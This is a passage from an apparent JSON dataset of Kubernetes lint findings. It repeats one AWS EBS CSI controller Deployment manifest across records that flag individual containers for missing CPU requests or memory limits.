    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ebs-plugin\" has cpu request 0"
  },
  {
    "id": "7295",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"liveness-probe\" has cpu request 0"
  },
  {
    "id": "7296",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"csi-attacher\" has memory limit 0"
  },
  {
    "id": "7297",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"csi-provisioner\" has memory limit 0"
  },
  {
    "id": "7298",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"csi-resizer\" has memory limit 0"
  },
  {
    "id": "7299",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"csi-snapshotter\" has memory limit 0"
  },
  {
    "id": "7300",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-snapshotter\n        image: k8s.gcr.io/sig-storage/csi-snapshotter:v3.0.3\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --leader-election=true\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-resizer\n        image: k8s.gcr.io/sig-storage/csi-resizer:v1.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: liveness-probe\n        image: k8s.gcr.io/sig-storage/livenessprobe:v2.4.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ebs-plugin\" has memory limit 0"
  },
  {
    "id": "7301",
    "manifest_path": "data/manifests/the_stack_sample/sample_2660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: ebs-csi-controller\n  labels:\n    app.kubernetes.io/name: aws-ebs-csi-driver\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: ebs-csi-controller\n      app.kubernetes.io/name: aws-ebs-csi-driver\n  template:\n    metadata:\n      labels:\n        app: ebs-csi-controller\n        app.kubernetes.io/name: aws-ebs-csi-driver\n    spec:\n      serviceAccountName: ebs-csi-controller-sa\n      containers:\n      - name: ebs-plugin\n        image: public.ecr.aws/ebs-csi-driver/aws-ebs-csi-driver:v1.6.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=2\n        env:\n        - name: CSI_ENDPOINT\n          value: unix:///var/lib/csi/sockets/pluginproxy/csi.sock\n        - name: CSI_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: AWS_ACCESS_KEY_ID\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: key_id\n              optional: true\n        - name: AWS_SECRET_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: aws-secret\n              key: access_key\n              optional: true\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n        ports:\n        - name: healthz\n          containerPort: 9808\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n      - name: csi-provisioner\n        image: k8s.gcr.io/sig-storage/csi-provisioner:v2.1.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --v=2\n        - --feature-gates=Topology=true\n        - --extra-create-metadata\n        - --leader-election=true\n        - --default-fstype=ext4\n        env:\n        - name: ADDRESS\n          value: /var/lib/csi/sockets/pluginproxy/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /var/lib/csi/sockets/pluginproxy/\n      - name: csi-attacher\n        image: k8s.gcr.io/sig-storage/csi-attacher:v3.1.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - 